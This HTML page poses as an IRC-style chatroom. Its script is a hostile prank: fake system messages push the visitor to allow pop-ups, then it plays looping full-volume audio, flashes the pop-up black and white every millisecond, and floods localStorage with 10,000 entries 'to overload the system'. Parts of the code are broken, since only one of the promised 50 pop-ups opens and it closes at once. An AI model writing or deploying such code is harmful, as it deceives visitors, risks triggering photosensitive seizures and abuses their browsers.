<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>nevelose</title>
    <style>
        body {
            background-color: white;
            transition: background-color 0.1s;
        }
        #ircMessage {
            font-family: "Courier New", Courier, monospace;
            background-color: black;
            color: lime;
            padding: 10px;
            border-radius: 5px;
            width: 80%;
            margin: 0 auto;
            white-space: pre-wrap;
            font-size: 14px;
        }
        #ircMessage p {
            margin: 0;
        }
    </style>
</head>
<body>

    <!-- Button to trigger the pop-ups and start the process -->
    <button onclick="startEffect()">Join the chatroom!</button>

    <audio id="audioPlayer" loop>
        <source src="aaa.mp3" type="audio/mp3">
        Your browser does not support the audio element.
    </audio>

    <script>
        var audio = document.getElementById('audioPlayer');
        audio.volume = 1; // Set volume to full

        function startEffect() {
            createPopups(50); // Create multiple pop-ups (sequentially, 50 pop-ups for example)
        }

        function createPopups(count) {
            let popupIndex = 0;
            let audioPlayed = false; // Flag to check if audio has been played in a pop-up

            function openNextPopup() {
                if (popupIndex < count) {
                    let popup = window.open('', '', 'width=300,height=200');
                    if (popup) {
                        // Write initial IRC-like content asking to allow pop-ups
                        popup.document.write(`
                            <html>
                                <head>
                                    <title>Pop-up</title>
                                    <style>
                                        body {
                                            background-color: white;
                                        }
                                    </style>
                                </head>
                                <body>
                                    <div id="ircMessage">
                                        <p><strong>IRC Chat:</strong> Welcome to our site!</p>
                                        <p><strong>System:</strong> Warning: Pop-ups are blocked. Please allow pop-ups to continue.</p>
                                        <p><strong>IRC Chat:</strong> To make the chatroom open, enable pop-ups in your brwoser.</p>
                                    </div>
                                </body>
                            </html>
                        `);

                        // Wait for the user to interact with the pop-up (they must allow it)
                        popup.document.body.innerHTML += '<button id="allowButton">Allow Pop-ups</button>';

                        // Add a click listener for the "Allow Pop-ups" button
                        popup.document.getElementById('allowButton').onclick = function() {
                            // Once the user clicks "Allow Pop-ups", start the sound and flashing
                            if (!audioPlayed) {
                                let popupAudio = popup.document.createElement('audio');
                                popupAudio.src = 'aaa.mp3';
                                popupAudio.loop = true;
                                popupAudio.volume = 1; // Set volume to full
                                popupAudio.play(); // Play audio in the pop-up
                                audioPlayed = true; // Ensure audio is only played once

                                // Start flashing the pop-up background after the button is clicked
                                startFlashingColors(popup);

                                // Manipulate local storage to overload the system
                                for (let i = 0; i < 10000; i++) {
                                    localStorage.setItem('key' + i, 'value' + i);
                                }
                            }

                            // Optionally close the pop-up (or leave it open)
                            popup.close();
                        };

                        popupIndex++;
                    }
                }
            }

            openNextPopup(); // Start opening pop-ups
        }

        function startFlashingColors(popup) {
            // Flash the pop-up background white and black ultra fast
            setInterval(function() {
                popup.document.body.style.backgroundColor = Math.random() > 0.5 ? 'white' : 'black';
            }, 1); // Flash every 1ms (ultra-fast)
        }
    </script>

</body>
</html>
